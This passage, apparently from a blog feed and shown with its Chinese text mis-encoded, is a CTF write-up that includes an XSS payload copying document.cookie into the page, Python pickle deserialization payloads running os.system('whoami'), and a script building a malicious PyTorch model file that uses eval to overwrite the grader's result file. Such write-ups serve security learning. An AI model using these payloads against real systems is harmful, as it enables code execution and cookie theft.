åŒ¹é…#greeting,#scoreå¯¹è±¡å¹¶è¾“å‡ºï¼Œå¹¶æŠŠflagå†™å…¥JSçš„cookieä¸­ã€‚æ‰€ä»¥æŠŠcookieå†™å…¥åˆ°#greetingæˆ–è€…#scoreå…¶ä¸­ä¸€ä¸ªå†…å°±ä¼šæŠŠflagè¾“å‡ºã€‚</p><p>payload:<code>1:&lt;img src=a onerror=&#39;var b=document.cookie;document.querySelector(&quot;#greeting&quot;).textContent=b;&#39;&gt;</code></p><p>base64åŠ å¯†åå¤åˆ¶urlè‡³terminal ctrl+shift+V</p><p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20221104220956849.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20221104220956849.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p><h2 id="äºŒæ¬¡å…ƒç¥ç»ç½‘ç»œ"><a href="#äºŒæ¬¡å…ƒç¥ç»ç½‘ç»œ" class="headerlink" title="äºŒæ¬¡å…ƒç¥ç»ç½‘ç»œ"></a>äºŒæ¬¡å…ƒç¥ç»ç½‘ç»œ</h2><blockquote><p>å¤©å†·æäº†ï¼Œä¸‹ç€é›ªï¼Œåˆå¿«é»‘äº†ã€‚è¿™æ˜¯ä¸€å¹´çš„æœ€åä¸€å¤©â€”â€”å¤§å¹´å¤œã€‚åœ¨è¿™åˆå†·åˆé»‘çš„æ™šä¸Šï¼Œä¸€ä¸ªæ²¡æœ‰ GPUã€æ²¡æœ‰ TPU çš„å°å¥³å­©ï¼Œåœ¨è¡—ä¸Šç¼“ç¼“åœ°èµ°ç€ã€‚å¥¹ä»å®¶é‡Œå‡ºæ¥çš„æ—¶å€™è¿˜å¸¦ç€æ¡åƒåœ¾æ¡æ¥çš„ E3 å¤„ç†å™¨ï¼Œä½†æ˜¯æœ‰ä»€ä¹ˆç”¨å‘¢ï¼Ÿè·‘ä¸åŠ¨ Stable  Diffusionï¼Œä¹Ÿè·‘ä¸åŠ¨ NovelAIã€‚å¥¹ä¹Ÿæƒ³ç”¨è‡ªå·±çš„å¤„ç†å™¨è®­ç»ƒä¸€ä¸ªç¥ç»ç½‘ç»œï¼Œç”Ÿæˆä¸€äº›äºŒæ¬¡å…ƒçš„å›¾ç‰‡ã€‚<br>äºæ˜¯å¥¹é…ç½®å¥½äº† PyTorch 1.9.1ï¼Œå®šä¹‰äº†ä¸€ä¸ªæå…¶ç®€å•çš„æ¨¡å‹ï¼Œç”¨è‡ªå·±æ”¶é›†çš„ 10 å¼ äºŒæ¬¡å…ƒå›¾ç‰‡å’Œå¯¹åº”çš„æ ‡ç­¾å¼€å§‹äº†è®­ç»ƒã€‚</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">SimpleGenerativeModel(</span><br><span class="line"> (tag_encoder): TagEncoder(</span><br><span class="line">   (embedding): Embedding(63, 8, padding_idx=0)</span><br><span class="line"> )</span><br><span class="line"> (model): Sequential(</span><br><span class="line">   (0): Linear(in_features=16, out_features=8, bias=True)</span><br><span class="line">   (1): ReLU()</span><br><span class="line">   (2): Linear(in_features=8, out_features=8, bias=True)</span><br><span class="line">   (3): ReLU()</span><br><span class="line">   (4): Linear(in_features=8, out_features=64 * 64 * 3, bias=True)</span><br><span class="line">   (5): Tanh()</span><br><span class="line"> )</span><br><span class="line">)</span><br></pre></td></tr></table></figure><p>å¥¹åœ¨ CPU ä¸Šå¼€å§‹äº†ç¬¬ä¸€ä¸ª epoch çš„è®­ç»ƒï¼Œloss ä¸€ç›´åœ¨ä¸‹é™ï¼Œè®¸å¤šäºŒæ¬¡å…ƒå›¾ç‰‡é‡å åœ¨ä¸€èµ·ï¼Œåœ¨å‘å¥¹çœ¨çœ¼ç›ã€‚<br>å¥¹åˆå¼€å§‹äº†ç¬¬äºŒä¸ª epochï¼Œloss è¶Šæ¥è¶Šä½ï¼Œå›¾ç‰‡è¶Šæ¥è¶Šç²¾ç¾ï¼Œå¥¹çš„çœ¼ç›ä¹Ÿè¶Šæ¥è¶Šç´¯ï¼Œå¥¹çš„çœ¼ç›å¼€å§‹é—­ä¸Šäº†ã€‚<br>â€¦<br>ç¬¬äºŒå¤©æ¸…æ™¨ï¼Œè¿™ä¸ªå°å¥³å­©ååœ¨å¢™è§’é‡Œï¼Œä¸¤è…®é€šçº¢ï¼Œå˜´ä¸Šå¸¦ç€å¾®ç¬‘ã€‚æ–°å¹´çš„å¤ªé˜³å‡èµ·æ¥äº†ï¼Œç…§åœ¨å¥¹å°å°çš„å°¸ä½“ä¸Šã€‚<br>äººä»¬å‘ç°å¥¹æ—¶æ‰çŸ¥é“ï¼Œå¥¹çš„æ¨¡å‹åœ¨ 10 å¼ å›¾ç‰‡ä¸Šè¿‡æ‹Ÿåˆäº†ï¼Œå‡ ä¹æ²¡æœ‰è¯¯å·®ã€‚<br>ï¼ˆå®Œï¼‰<br>å¬å®Œè¿™ä¸ªæ•…äº‹ï¼Œä½ ä¸€è„¸çš„ä¸ç›¸ä¿¡ï¼šã€Œè¿™ä¹ˆç®€å•çš„æ¨¡å‹æ€ä¹ˆå¯èƒ½æ²¡æœ‰è¯¯å·®å‘¢ï¼Ÿã€ï¼Œäºæ˜¯ä½ å¼€å§‹å¤ç°è¿™ä¸ªäºŒæ¬¡å…ƒç¥ç»ç½‘ç»œã€‚</p></blockquote><h3 id="pythonååºåˆ—åŒ–çŸ¥è¯†"><a href="#pythonååºåˆ—åŒ–çŸ¥è¯†" class="headerlink" title="pythonååºåˆ—åŒ–çŸ¥è¯†"></a>pythonååºåˆ—åŒ–çŸ¥è¯†</h3><p>pythoné€šè¿‡loadsååºåˆ—åŒ–ï¼Œdumpsåºåˆ—åŒ–ã€‚å’Œphpä¸€æ ·å¯ä»¥åºåˆ—åŒ–å­—ç¬¦ä¸²ã€æ•°ç»„ã€æ•°å’Œç±»</p><p>pickletoolså¯ä»¥åæ±‡ç¼–ä¸€ä¸ªåºåˆ—åŒ–å‡ºæ¥çš„å­—ç¬¦ä¸²ï¼Œæ–¹ä¾¿è°ƒè¯•ï¼Œåˆ†ææ¡ˆä¾‹è§<code>https://xz.aliyun.com/t/7436</code>ï¼Œæ–‡ç« è¯¦ç»†ä»‹ç»äº†åç³»åˆ—åŒ–åŸç†ï¼Œå¹¶ä¸”ç»™å‡ºäº†opcodeçš„ç”¨æ³•</p><p>é€šç”¨çš„pocï¼Œåˆ©ç”¨<code>__reduce__</code>RCE</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">import pickle</span><br><span class="line">import os</span><br><span class="line"></span><br><span class="line">class genpoc(object):</span><br><span class="line">    def __reduce__(self):</span><br><span class="line">        s = &quot;&quot;&quot;echo test &gt;poc.txt&quot;&quot;&quot;  # è¦æ‰§è¡Œçš„å‘½ä»¤</span><br><span class="line">        return os.system, (s,)        # reduceå‡½æ•°å¿…é¡»è¿”å›å…ƒç»„æˆ–å­—ç¬¦ä¸²</span><br><span class="line"></span><br><span class="line">e = genpoc()</span><br><span class="line">poc = pickle.dumps(e)</span><br><span class="line"></span><br><span class="line">print(poc) # æ­¤æ—¶ï¼Œå¦‚æœ pickle.loads(poc)ï¼Œå°±ä¼šæ‰§è¡Œå‘½ä»¤</span><br></pre></td></tr></table></figure><p>ä½†æ˜¯éœ€è¦ä¸€æ¬¡æ‰§è¡Œå¤šä¸ªå‡½æ•°æ—¶å°±ä¸èƒ½å…‰ç”¨<code>__reduce__</code>ï¼Œreduceä¸€æ¬¡åªèƒ½æ‰§è¡Œä¸€ä¸ªå‡½æ•°(é™¤äº†execå¯ä»¥å †å æ‰§è¡Œå‘½ä»¤)ã€‚å½“ç„¶è¿™é“é¢˜å°±ä¸€ä¸ªreduceå°±å¯ä»¥äº†ã€‚opcodeçš„ç¼–å†™å®ä¾‹ï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"># main.py</span><br><span class="line">import pickle</span><br><span class="line">import secret</span><br><span class="line"></span><br><span class="line">opcode=&#x27;&#x27;&#x27;c__main__</span><br><span class="line">secret</span><br><span class="line">(S&#x27;name&#x27;</span><br><span class="line">S&#x27;1&#x27;</span><br><span class="line">db.&#x27;&#x27;&#x27;</span><br><span class="line"></span><br><span class="line">print(&#x27;before:&#x27;,secret.name)</span><br><span class="line"></span><br><span class="line">output=pickle.loads(opcode.encode())</span><br><span class="line"></span><br><span class="line">print(&#x27;output:&#x27;,output)</span><br><span class="line">print(&#x27;after:&#x27;,secret.name)</span><br></pre></td></tr></table></figure><p>ä¸Šè¿°ä»£ç ç”¨<code>c</code>è·å–å…¨å±€å˜é‡secretï¼Œç”¨<code>d</code>å»ºç«‹ä¸€ä¸ªå­—å…¸ï¼Œ<code>b</code>ç”¨æ ˆçš„ç¬¬ä¸€ä¸ªå…ƒç´ åškey,ç¬¬äºŒä¸ªå…ƒç´ åšå±æ€§ï¼Œ<code>(</code>å‹æ ˆï¼Œ<code>S&#39;&#39;</code>ä¸ºå­—ç¬¦ä¸²å¯¹è±¡ï¼Œ<code>.</code>ç»“æŸã€‚æ‰€ä»¥ä»¥ä¸Šä»£ç çš„æ„æ€ä¸ºname&#x3D;1å¯¹å…¨å±€å˜é‡nameçš„å€¼è¿›è¡Œè¦†ç›–ã€‚</p><p>åŒç†ï¼Œæ„é€ å‡½æ•°å¯ä»¥ç”¨<code>R</code>,<code>i</code>,<code>o</code></p><ol><li>R</li></ol><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">b&#x27;&#x27;&#x27;cos</span><br><span class="line">system</span><br><span class="line">(S&#x27;whoami&#x27;</span><br><span class="line">tR.&#x27;&#x27;&#x27;</span><br></pre></td></tr></table></figure><p><code>cos</code>importåº“ï¼Œ<code>t</code>è¡¨ç¤ºä»ä¸Šä¸€ä¸ª<code>(</code>å¼€å§‹æŠŠåé¢çš„å…ƒç´ ç»„åˆä¸ºå…ƒç»„ï¼Œä¸Šè¿°ä»£ç åªæœ‰ä¸€ä¸ª<code>Sâ€˜whoami&#39;</code>ï¼Œå°±æ„æˆ<code>[&#39;whoami&#39;]</code>ï¼ŒRè¡¨ç¤ºæ ˆçš„ç¬¬ä¸€ä¸ªå¯¹è±¡<code>system</code>ä½œä¸ºå‡½æ•°ï¼Œç¬¬äºŒä¸ªå¯¹è±¡ä¹Ÿå°±æ˜¯<code>[&#39;whoami&#39;]</code>ä½œä¸ºå‚æ•°è°ƒç”¨å‡½æ•°ï¼Œç»„åˆèµ·æ¥å°±æ˜¯<code>system(whoami)</code>ï¼ˆä¸éœ€è¦å•å¼•å·åŒ…è£¹whoamiå› ä¸ºå·²ç»ç”¨Sâ€™â€˜è¡¨ç¤ºäº†æ•°æ®ç±»å‹ï¼‰</p><ol start="2"><li>i</li></ol><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">b&#x27;&#x27;&#x27;(S&#x27;whoami&#x27;</span><br><span class="line">ios</span><br><span class="line">system</span><br><span class="line">.&#x27;&#x27;&#x27;</span><br></pre></td></tr></table></figure><p><code>s</code>ç”Ÿæˆsystem-whoamié”®å€¼å¯¹å¹¶æ·»åŠ åˆ°æ ˆçš„ç¬¬ä¸‰ä¸ªå¯¹è±¡ï¼Œå¹¶æŠŠwhoamiå’Œsystemå‡ºæ ˆï¼Œoå®ä¾‹åŒ–system-whoamiå¯¹è±¡ï¼Œiè°ƒç”¨oå®ç°å‡½æ•°è°ƒç”¨ã€‚<code>system(whoami)</code></p><ol start="3"><li>o</li></ol><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">b&#x27;&#x27;&#x27;(cos</span><br><span class="line">system</span><br><span class="line">S&#x27;whoami&#x27;</span><br><span class="line">o.&#x27;&#x27;&#x27;</span><br></pre></td></tr></table></figure><p>oæ“ä½œè°ƒç”¨systemä¸ºå‡½æ•°ï¼Œwhoamiä¸ºå‚æ•°æ‰§è¡Œã€‚å’ŒRåŒºåˆ«ä¸åŒçš„æ˜¯å‚æ•°å¯¹è±¡ä¸ç”¨ä¸ºå…ƒç»„</p><h3 id="é¢˜è§£"><a href="#é¢˜è§£" class="headerlink" title="é¢˜è§£"></a>é¢˜è§£</h3><p>å¦‚æœè®¤çœŸäº†è§£è¿‡pythonååºåˆ—åŒ–ï¼Œæ¯ç¯‡æ–‡ç« å¼€å§‹å‡ ä¹éƒ½ä¼šä»‹ç»pythonååºåˆ—åŒ–çš„å…¥å£å‡½æ•°ï¼Œä¹Ÿå°±æ˜¯pickleæ¨¡å—çš„pickle.loadå’Œpickle.loadsï¼Œè€Œtorch.loadååºåˆ—åŒ–çš„æ–¹å¼å’Œpickle.loadå®Œå…¨ç›¸åŒï¼Œæ‰€ä»¥åˆ©ç”¨æ–¹å¼ä¹Ÿç›¸åŒã€‚</p><p>é¢˜ç›®æ‰“å¼€ä¸ºå¦‚ä¸‹ç•Œé¢ï¼š</p><p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20221106164307866.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20221106164307866.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p><p>ä¸‹è½½è§£å‹é™„ä»¶2d_model.zipã€‚é¢˜ç›®æè¿°ä¸Šä¼ æ¨¡å‹ç”±infer.pyè¿è¡Œã€‚infer.pyæºç ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> io</span><br><span class="line"><span class="keyword">import</span> json</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> torch</span><br><span class="line"><span class="keyword">import</span> matplotlib</span><br><span class="line"><span class="keyword">import</span> matplotlib.image</span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> models <span class="keyword">import</span> SimpleGenerativeModel</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">infer</span>(<span class="params">pt_file</span>):</span><br><span class="line">    <span class="comment"># load input data</span></span><br><span class="line">    tag_ids = torch.load(<span class="string">&quot;dataset/tags_10.pt&quot;</span>, map_location=<span class="string">&quot;cpu&quot;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># args</span></span><br><span class="line">    n_tags = <span class="number">63</span></span><br><span class="line">    dim = <span class="number">8</span></span><br><span class="line">    img_shape = (<span class="number">64</span>, <span class="number">64</span>, <span class="number">3</span>)</span><br><span class="line">    </span><br><span class="line">    <span class="comment"># load model</span></span><br><span class="line">    model = SimpleGenerativeModel(n_tags=n_tags, dim=dim, img_shape=img_shape)</span><br><span class="line">    model.load_state_dict(torch.load(pt_file, map_location=<span class="string">&quot;cpu&quot;</span>))</span><br><span class="line">    </span><br><span class="line">    <span class="comment"># generate noise</span></span><br><span class="line">    torch.manual_seed(<span class="number">0</span>)</span><br><span class="line">    n_samples = tag_ids.shape[<span class="number">0</span>]</span><br><span class="line">    noise = torch.randn(n_samples, dim)</span><br><span class="line">    </span><br><span class="line">    <span class="comment"># forward</span></span><br><span class="line">    <span class="keyword">with</span> torch.no_grad():</span><br><span class="line">        model.<span class="built_in">eval</span>()</span><br><span class="line">        predictions = model(noise, tag_ids).clamp(<span class="number">0</span>, <span class="number">1</span>)</span><br><span class="line">    </span><br><span class="line">    gen_imgs = []</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(n_samples):</span><br><span class="line">        out_io = io.BytesIO()</span><br><span class="line">        matplotlib.image.imsave(out_io, predictions[i].numpy(), <span class="built_in">format</span>=<span class="string">&quot;png&quot;</span>)</span><br><span class="line">        png_b64 = base64.b64encode(out_io.getvalue()).decode()</span><br><span class="line">        gen_imgs.append(png_b64)</span><br><span class="line">    </span><br><span class="line">    <span class="comment"># save the predictions</span></span><br><span class="line">    json.dump(&#123;<span class="string">&quot;gen_imgs_b64&quot;</span>: gen_imgs&#125;, <span class="built_in">open</span>(<span class="string">&quot;/tmp/result.json&quot;</span>, <span class="string">&quot;w&quot;</span>))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    infer(<span class="built_in">open</span>(<span class="string">&quot;checkpoint/model.pt&quot;</span>, <span class="string">&quot;rb&quot;</span>))</span><br><span class="line">    <span class="built_in">print</span>(<span class="built_in">open</span>(<span class="string">&quot;/tmp/result.json&quot;</span>, <span class="string">&quot;r&quot;</span>).read())</span><br></pre></td></tr></table></figure><p>åœ¨checkpointç›®å½•ä¸‹æœ‰è®­ç»ƒå¥½çš„model.ptï¼Œä¸Šä¼ åè¯¯å·®å¾ˆå¤§ï¼ˆæœºå™¨å­¦ä¹ å¤§ä½¬å¯ä»¥è€ƒè™‘è®­ç»ƒç²¾å‡†åº¦å¾ˆé«˜çš„æ¨¡å‹è¯•ç€ä¸Šä¼ ï¼‰</p><p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20221106164754107.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20221106164754107.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p><p>infer.pyåŠ è½½tags_10.ptå¯¹ä¸Šä¼ çš„model.ptè¿›è¡Œé¢„æµ‹ï¼Œå¹¶åœ¨è®­ç»ƒç»“æŸåæŠŠç­”æ¡ˆå†™è¿›&#x2F;tmp&#x2F;result.jsonä¸­ï¼Œè€Œåœ¨dataseté‡Œè¿˜æœ‰å¦ä¸€ä¸ªæ¨¡å‹ï¼Œä¸ºpixels_10.ptï¼ˆtrain.pyè®­ç»ƒæ¨¡å‹çš„ä»£ç å¦‚ä¸‹ï¼‰ã€‚æ‰€ä»¥æ„é€ çš„å…³é”®å°±æ˜¯å‘&#x2F;tmp&#x2F;result.jsonä¸­å†™å…¥æ ‡å‡†çš„åºåˆ—åŒ–æ¨¡å‹ã€‚</p><p>æœ¬é¢˜æ‰€ç”¨çš„æœºå™¨å­¦ä¹ çš„çŸ¥è¯†ä»…æœ‰ï¼šè®­ç»ƒæ˜¯æŒ‡åˆ›å»ºæ¨¡å‹ï¼Œå‘æ¨¡å‹å±•ç¤ºæ ‡ç­¾æ ·æœ¬ï¼Œè®©æ¨¡å‹å­¦ä¹ ç‰¹å¾å’Œæ ‡ç­¾çš„å…³ç³»ï¼›æ¨æ–­æ˜¯æŒ‡è®­ç»ƒåçš„æ¨¡å‹åšå‡ºæœ‰ç”¨çš„é¢„æµ‹ã€‚train.pyä¾¿æ˜¯åˆ›å»ºæ¨¡å‹ã€‚infer.pyä¾¿æ˜¯è®©æ¨¡å‹åšå‡ºé¢„æµ‹ã€‚é¢„æµ‹çš„æ ‡å‡†ç­”æ¡ˆå°±åœ¨pixels.pté‡Œ</p><p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20221106174115925.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20221106174115925.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p><p>æ‰€ä»¥payloadå¦‚ä¸‹ï¼šï¼ˆå› ä¸ºevalä»£ç æ‰§è¡Œå’Œæœ¬èº«æ‰§è¡Œçš„åŸå› ï¼Œéœ€è¦å¯¹\å’Œå•å¼•å·è½¬ä¹‰ï¼‰</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> io</span><br><span class="line"><span class="keyword">import</span> json</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> torch</span><br><span class="line"><span class="keyword">import</span> matplotlib</span><br><span class="line"><span class="keyword">import</span> matplotlib.image</span><br><span class="line"></span><br><span class="line"><span class="comment"># åŠ è½½æ­£ç¡®ç­”æ¡ˆ</span></span><br><span class="line"></span><br><span class="line">pixel=<span class="string">&quot;pixels_10.pt&quot;</span></span><br><span class="line">predictions = torch.load(pixel, map_location=<span class="string">&quot;cpu&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># å‘/tmp/result.jsonä¸­å†™å…¥æ­£ç¡®æ•°æ®</span></span><br><span class="line"></span><br><span class="line">gen_imgs = []</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">10</span>):</span><br><span class="line">    out_io = io.BytesIO()</span><br><span class="line">    matplotlib.image.imsave(out_io, predictions[i].numpy(), <span class="built_in">format</span>=<span class="string">&quot;png&quot;</span>)</span><br><span class="line">    png_b64 = base64.b64encode(out_io.getvalue()).decode()</span><br><span class="line">    gen_imgs.append(png_b64)</span><br><span class="line"></span><br><span class="line">content = json.dumps(&#123;<span class="string">&quot;gen_imgs_b64&quot;</span>: gen_imgs&#125;)</span><br><span class="line"></span><br><span class="line">content.replace(<span class="string">&#x27;\\&#x27;</span>, <span class="string">&#x27;\\\\&#x27;</span>).replace(<span class="string">&quot;&#x27;&quot;</span>, <span class="string">&quot;\\&#x27;&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># æ„é€ è¦æ‰§è¡Œçš„ python ä»£ç </span></span><br><span class="line"></span><br><span class="line">args = <span class="string">&quot;open(&#x27;/tmp/result.json&#x27;, &#x27;w&#x27;).write(&#x27;&quot;</span> + content + <span class="string">&quot;&#x27;)&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># é€šè¿‡ __reduce__ æ–¹æ³•æ‰§è¡Œ python ä»£ç </span></span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Exploit</span>(<span class="title class_ inherited__">object</span>):</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__reduce__</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="keyword">return</span> (<span class="built_in">eval</span>, (args,))</span><br><span class="line"></span><br><span class="line">torch.save(Exploit(), <span class="string">&quot;model_exp.pt&quot;</span>, _use_new_zipfile_serialization=<span class="literal">False</span>)</span><br></pre></td></tr></table></figure><p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20221106210723891.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20221106210723891.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p><p>å°†ç”Ÿæˆçš„model_exp.ptä¸Šä¼ ï¼Œå°±èƒ½åŒ¹é…æ­£ç¡®å€¼</p><p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20221106211047310.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20221106211047310.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p><p>åˆšå…¥é—¨æœºå™¨å­¦ä¹ çš„ï¼Œæ¯”å¦‚æˆ‘ï¼Œä¼šé‡åˆ°ç”±äºç‰ˆæœ¬ä¸å¯¹æ— æ³•å®‰è£…torchçš„é—®é¢˜ï¼ŒæŸ¥çœ‹è‡ªå·±pythonæ”¯æŒçš„ç‰ˆæœ¬æœ‰ä¸‰ç§æ–¹æ³•ï¼Œä¸€ä¸ªä¸€ä¸ªè¯•ï¼š</p><p>1. </p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> pip._internal.pep425tags</span><br><span class="line"><span class="built_in">print</span>(pip._internal.pep425tags.get_supported())</span><br></pre></td></tr></table></figure><p>2. </p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> wheel.pep425tags</span><br><span class="line">   <span class="built_in">print</span>(wheel.pep425tags.get_supported())</span><br></pre></td></tr></table></figure><p>3. </p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python -m pip debug --verbose</span><br></pre></td></tr></table></figure><p>ä¸è¿‡æœ€å¤§çš„é—®é¢˜æ˜¯torchåœ¨32ä½çš„pythonä¸‹æ˜¯æ— æ³•æ­£å¸¸å·¥ä½œçš„ï¼Œéœ€è¦è£…64ä½çš„pythonï¼Œåªéœ€è¦æŠŠ64ä½pythonçš„ç³»ç»Ÿå˜é‡å†™åœ¨32ä½ä¹‹ä¸Š(pythonå’Œscript)ã€‚æ•´äº†ä¸€æ™šä¸Šï¼Œå¤ªå‘äº†</p><p>è¿˜æœ‰ä¸€ç§æ‰‹æ³•ä¸éœ€è¦æ­£ç¡®çš„ç­”æ¡ˆï¼Œè€Œæ˜¯ç”¨å‰é¢å®šä¹‰çš„å‚æ•°ï¼ˆä¹Ÿå°±æ˜¯æ­£ç¡®çš„n_tags,dim,img_shapeï¼‰å†™å…¥åˆ°&#x2F;tmp&#x2F;result.jsonï¼Œä½†æ˜¯åé¢çš„json.dumpå’Œopenä¹Ÿä¼šæ‰§è¡Œï¼Œæ‰€ä»¥è¿›è¡Œäº†ç»•è¿‡ã€‚å…·ä½“è§å¤§ä½¬åšå®¢ï¼š<code>https://blog.tonycrane.cc/p/169d9f3d.html#%E4%BA%8C%E6%AC%A1%E5%85%83%E7%A5%9E%E7%BB%8F%E7%BD%91%E7%BB%9C</code></p><p>æœ€åä¸€ä¸ªä½ å…ˆåˆ«æ€¥sqliteæ³¨å…¥å¯ä»¥ç”¨éªŒè¯ç è¯†åˆ«è¿›è¡Œå¸ƒå°”ç›²æ³¨ï¼Œæˆ–è€…æ‰‹å·¥ï¼Œä½†æ˜¯ä¼šæ…¢ä¸€ç‚¹ï¼Œå¾ˆå¤šå¤§ä½¬éƒ½å†™è¿‡äº†ã€‚</p><p>å‚è€ƒé“¾æ¥ï¼š<code>https://exexute.github.io/2019/04/24/how-hacking-with-LaTex/</code></p>]]></content>
      
      
      <categories>
          
          <category> ctf </category>
          
          <category> WP </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF </tag>
            
            <tag> çˆ¬è™« </tag>
            
            <tag> æœºå™¨å­¦ä¹  </tag>
            
            <tag> pythonååºåˆ—åŒ– </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>msfç¬”è®°</title>
      <link href="/2022/01/03/msf-bi-ji/"/>
